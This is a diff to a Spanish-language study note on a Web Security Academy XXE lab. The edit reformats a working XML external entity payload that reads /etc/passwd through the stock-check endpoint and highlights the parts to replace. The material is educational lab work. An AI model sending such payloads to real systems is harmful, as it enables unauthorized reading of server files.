@@ -17,17 +17,18 @@ tags:
 - Si esto funciona, **no necesitás nada más** — todo lo que sigue (002…008) existe porque en el mundo real alguna de estas dos condiciones se cae.
 
 ## Cómo explotarlo
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
 El "Check stock" manda XML (ojo al `Content-Type`):
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 Content-Length: 134
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
-```
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "<mark>file:///etc/passwd</mark>"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 - El `<!DOCTYPE …>` va **entre** `<?xml?>` y `<stockCheck>`.
 - `&xxe;` reemplaza `productId` (el campo que se refleja) → la respuesta trae el `/etc/passwd`.
 
